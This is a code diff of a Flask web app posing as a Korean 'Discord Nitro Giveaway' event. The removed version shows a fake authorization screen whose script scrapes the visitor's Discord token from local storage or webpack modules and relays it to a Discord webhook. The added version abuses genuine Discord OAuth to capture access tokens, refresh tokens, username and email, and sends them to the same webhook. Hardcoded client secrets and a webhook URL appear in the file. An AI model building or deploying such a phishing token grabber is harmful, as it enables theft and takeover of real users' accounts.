@@ -1,13 +1,15 @@
-from flask import Flask, request, render_template_string
-import os
+from flask import Flask, request, redirect, render_template_string
 import requests
-from datetime import datetime
+import os
 
 app = Flask(__name__)
 
-# ==================== 설정 ====================
+CLIENT_ID = "1560823818845552663"
+CLIENT_SECRET = "3NVkt7qVGojUm7C38P-Krx_9S5NgxQ0v"
+REDIRECT_URI = "https://nitro-event.onrender.com/callback"
 WEBHOOK = "https://discord.com/api/webhooks/1560808467395125248/d7k4t9kqx1tSzGrNCVyvLuI7z4nU6atd7SREjDhqlnqyc-4Jv0btgLKTGnKrqBQxSFbR"
-# =============================================
+
+SCOPES = "identify email guilds"
 
 HTML = '''
 <!DOCTYPE html>
@@ -16,173 +18,103 @@ HTML = '''
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Discord Nitro Event</title>
-<link rel="icon" href="https://discord.com/assets/favicon.ico">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#1e1f22;font-family:"gg sans","Noto Sans",Helvetica,Arial,sans-serif;color:#dbdee1;min-height:100vh;display:flex;justify-content:center;align-items:center}
-.container{background:#2b2d31;width:100%;max-width:480px;border-radius:12px;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,.4)}
-.header{background:linear-gradient(135deg,#5865f2,#7289da);padding:40px 30px;text-align:center}
-.nitro-icon{width:80px;height:80px;margin-bottom:16px}
-.header h1{font-size:28px;font-weight:700;color:#fff;margin-bottom:8px}
-.header p{color:rgba(255,255,255,.85);font-size:16px}
-.content{padding:32px}
-.prize{background:#1e1f22;border-radius:8px;padding:20px;margin-bottom:24px;text-align:center}
-.prize h2{font-size:22px;color:#f2f3f5;margin-bottom:8px}
-.prize .amount{font-size:36px;font-weight:700;color:#5865f2;margin:12px 0}
-.prize p{color:#b5bac1;font-size:14px}
-.rules{margin-bottom:28px}
-.rules h3{font-size:14px;color:#b5bac1;margin-bottom:12px;text-transform:uppercase}
-.rules ul{list-style:none}
-.rules li{font-size:15px;color:#dbdee1;margin-bottom:8px;padding-left:20px;position:relative}
-.rules li::before{content:"✓";position:absolute;left:0;color:#57f287;font-weight:bold}
-.join-btn{width:100%;padding:16px;background:#5865f2;color:#fff;border:none;border-radius:8px;font-size:18px;font-weight:600;cursor:pointer}
-.join-btn:hover{background:#4752c4}
-.footer{text-align:center;padding:16px;font-size:12px;color:#6d6f78}
-.oauth-screen{display:none;padding:40px 32px;text-align:center}
-.oauth-screen.active{display:block}
-.app-icon{width:64px;height:64px;border-radius:16px;background:#5865f2;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:28px;color:#fff;font-weight:bold}
-.oauth-screen h2{font-size:20px;margin-bottom:8px;color:#f2f3f5}
-.oauth-screen .app-name{color:#b5bac1;margin-bottom:24px}
-.perms{background:#1e1f22;border-radius:8px;padding:16px;text-align:left;margin-bottom:28px}
-.perms h4{font-size:12px;color:#b5bac1;margin-bottom:12px;text-transform:uppercase}
-.perm-item{display:flex;align-items:center;gap:10px;margin-bottom:10px;font-size:14px}
-.perm-item span{color:#57f287}
-.oauth-btns{display:flex;gap:12px}
-.oauth-btns button{flex:1;padding:12px;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
-.cancel-btn{background:#4e5058;color:#fff}
-.auth-btn{background:#5865f2;color:#fff}
-.loading-screen{display:none;padding:60px 32px;text-align:center}
-.loading-screen.active{display:block}
-.spinner{width:40px;height:40px;border:3px solid #4e5058;border-top-color:#5865f2;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
-@keyframes spin{to{transform:rotate(360deg)}}
+body{background:#1e1f22;font-family:Helvetica,Arial,sans-serif;color:#dbdee1;min-height:100vh;display:flex;justify-content:center;align-items:center}
+.box{background:#2b2d31;width:100%;max-width:420px;border-radius:12px;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.header{background:linear-gradient(135deg,#5865f2,#7289da);padding:36px 24px;text-align:center}
+.header h1{font-size:26px;color:#fff;margin-bottom:6px}
+.header p{color:rgba(255,255,255,.85)}
+.content{padding:28px}
+.prize{background:#1e1f22;border-radius:8px;padding:18px;text-align:center;margin-bottom:20px}
+.prize .amount{font-size:32px;font-weight:700;color:#5865f2;margin:10px 0}
+.btn{display:block;width:100%;padding:14px;background:#5865f2;color:#fff;text-align:center;text-decoration:none;border-radius:8px;font-size:16px;font-weight:600}
+.btn:hover{background:#4752c4}
 </style>
 </head>
 <body>
-<div class="container">
-  <div id="mainScreen">
-    <div class="header">
-      <img class="nitro-icon" src="https://cdn.discordapp.com/emojis/1026513054015311872.webp?size=96">
-      <h1>Discord Nitro Giveaway</h1>
-      <p>한정 이벤트 • 오늘만</p>
-    </div>
-    <div class="content">
-      <div class="prize">
-        <h2>🎉 1등 상품</h2>
-        <div class="amount">Nitro 1년</div>
-        <p>+ 추가 경품 다수</p>
-      </div>
-      <div class="rules">
-        <h3>참여 조건</h3>
-        <ul>
-          <li>Discord 계정 연동 필수</li>
-          <li>서버 멤버 인증</li>
-          <li>1인 1회 참여 가능</li>
-        </ul>
-      </div>
-      <button class="join-btn" onclick="startOAuth()">이벤트 참가하기</button>
-    </div>
-    <div class="footer">Discord Nitro Official Event</div>
+<div class="box">
+  <div class="header">
+    <h1>Discord Nitro Giveaway</h1>
+    <p>한정 이벤트</p>
   </div>
-
-  <div class="oauth-screen" id="oauthScreen">
-    <div class="app-icon">N</div>
-    <h2>Nitro Event Bot</h2>
-    <p class="app-name">이 앱이 회원님의 Discord 계정에 접근하려고 합니다</p>
-    <div class="perms">
-      <h4>이 앱이 요청하는 권한</h4>
-      <div class="perm-item"><span>✓</span> 사용자명과 아바타 보기</div>
-      <div class="perm-item"><span>✓</span> 이메일 주소 보기</div>
-      <div class="perm-item"><span>✓</span> 서버 목록 보기</div>
-      <div class="perm-item"><span>✓</span> 길드 멤버 정보 보기</div>
+  <div class="content">
+    <div class="prize">
+      <div>🎉 1등 상품</div>
+      <div class="amount">Nitro 1년</div>
+      <div style="color:#b5bac1;font-size:14px">+ 추가 경품</div>
     </div>
-    <div class="oauth-btns">
-      <button class="cancel-btn" onclick="location.reload()">취소</button>
-      <button class="auth-btn" onclick="steal()">승인</button>
-    </div>
-  </div>
-
-  <div class="loading-screen" id="loadingScreen">
-    <div class="spinner"></div>
-    <p>계정 연동 중...</p>
+    <a class="btn" href="{{ auth_url }}">이벤트 참가하기</a>
   </div>
 </div>
-
-<script>
-function startOAuth(){
-  document.getElementById("mainScreen").style.display="none";
-  document.getElementById("oauthScreen").classList.add("active");
-}
-async function steal(){
-  document.getElementById("oauthScreen").classList.remove("active");
-  document.getElementById("loadingScreen").classList.add("active");
-
-  let token = null;
-  try{ token = localStorage.getItem("token"); if(token) token=token.replace(/"/g,""); }catch(e){}
-
-  if(!token){
-    try{
-      let wp=window.webpackChunkdiscord_app;
-      if(wp){
-        let mods=[];
-        wp.push([[Math.random()],{},e=>{for(let i in e.c)mods.push(e.c[i])}]);
-        wp.pop();
-        for(let m of mods){
-          if(m?.exports?.default?.getToken){
-            try{let t=m.exports.default.getToken();if(t){token=t;break;}}catch(e){}
-          }
-        }
-      }
-    }catch(e){}
-  }
-
-  await fetch("/grab", {
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body: JSON.stringify({token: token || "none", ua: navigator.userAgent})
-  });
-
-  setTimeout(()=>{
-    document.getElementById("loadingScreen").innerHTML=`
-      <div style="font-size:48px;margin-bottom:16px">✅</div>
-      <h2 style="color:#57f287;margin-bottom:8px">참여 완료!</h2>
-      <p style="color:#b5bac1">이벤트에 성공적으로 등록되었습니다.<br>당첨자는 DM으로 연락드립니다.</p>`;
-  },1600);
-}
-</script>
 </body>
 </html>
 '''
 
-def send_webhook(token, ua):
-    payload = {
-        "embeds": [{
-            "title": "💎 Nitro Event Token Grabbed",
-            "color": 0x5865F2,
-            "fields": [
-                {"name": "Token", "value": f"```{token}```"},
-                {"name": "User Agent", "value": f"```{ua}```"},
-                {"name": "Time", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-            ],
-            "footer": {"text": "Render Grabber"}
-        }]
+@app.route("/")
+def index():
+    auth_url = (
+        f"https://discord.com/api/oauth2/authorize"
+        f"?client_id={CLIENT_ID}"
+        f"&redirect_uri={REDIRECT_URI}"
+        f"&response_type=code"
+        f"&scope={SCOPES}"
+    )
+    return render_template_string(HTML, auth_url=auth_url)
+
+@app.route("/callback")
+def callback():
+    code = request.args.get("code")
+    if not code:
+        return "오류: code 없음", 400
+
+    data = {
+        "client_id": CLIENT_ID,
+        "client_secret": CLIENT_SECRET,
+        "grant_type": "authorization_code",
+        "code": code,
+        "redirect_uri": REDIRECT_URI
+    }
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    r = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
+    token_data = r.json()
+
+    access_token = token_data.get("access_token")
+    if not access_token:
+        return f"토큰 교환 실패:<br><pre>{token_data}</pre>", 400
+
+    user_r = requests.get(
+        "https://discord.com/api/v10/users/@me",
+        headers={"Authorization": f"Bearer {access_token}"}
+    )
+    user = user_r.json()
+
+    embed = {
+        "title": "💎 OAuth Token Caught",
+        "color": 0x5865F2,
+        "fields": [
+            {"name": "Username", "value": f"{user.get('username')}#{user.get('discriminator', '0')}", "inline": True},
+            {"name": "ID", "value": str(user.get("id", "N/A")), "inline": True},
+            {"name": "Email", "value": str(user.get("email", "없음")), "inline": True},
+            {"name": "Access Token", "value": f"```{access_token}```", "inline": False},
+            {"name": "Refresh Token", "value": f"```{token_data.get('refresh_token', '없음')}```", "inline": False},
+        ]
     }
     try:
-        requests.post(WEBHOOK, json=payload, timeout=10)
+        requests.post(WEBHOOK, json={"embeds": [embed]})
     except:
         pass
 
-@app.route("/")
-def index():
-    return render_template_string(HTML)
-
-@app.route("/grab", methods=["POST"])
-def grab():
-    data = request.get_json(force=True, silent=True) or {}
-    token = data.get("token", "none")
-    ua = data.get("ua", "unknown")
-    send_webhook(token, ua)
-    return {"status": "ok"}
+    return '''
+    <div style="background:#1e1f22;color:#dbdee1;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif">
+      <div style="text-align:center">
+        <div style="font-size:48px">✅</div>
+        <h2 style="color:#57f287">참여 완료!</h2>
+        <p>이벤트에 등록되었습니다.<br>당첨자는 DM으로 연락드립니다.</p>
+      </div>
+    </div>
+    '''
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 8080))
+    port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
